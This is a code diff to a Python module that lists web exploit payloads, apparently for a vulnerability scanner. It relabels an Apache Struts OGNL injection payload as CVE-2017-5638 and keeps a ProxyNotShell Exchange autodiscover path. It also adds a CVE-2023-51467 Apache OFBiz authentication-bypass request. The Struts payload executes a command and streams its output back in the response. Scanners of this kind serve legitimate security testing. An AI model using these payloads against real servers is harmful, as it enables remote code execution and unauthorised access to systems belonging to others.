@@ -73,12 +73,12 @@ def define_payloads_2() -> Dict[str, List[str]]:
     return payloads_2
 
 def define_payloads_3() -> Dict[str, List[str]]:
-    """CVE-2022-41040 Proxy Not Shell and other CVE-specific payloads."""
+    """other CVE-specific payloads."""
     payloads_3 = {
         "Proxy Not Shell": [
             "/autodiscover/autodiscover.json?a@foo.var/owa/?&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell"
         ],
-        "CVE-Specific Payloads": [
+        "CVE-2017-5638": [
             """%{(#_='multipart/form-data')."""
             """(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."""
             """(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."""
@@ -94,6 +94,9 @@ def define_payloads_3() -> Dict[str, List[str]]:
             """(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."""
             """(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."""
             """(#ros.flush())}"""
+        ],
+        "cve-2023-51467":[
+            "/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y"
         ]
     }
     return payloads_3
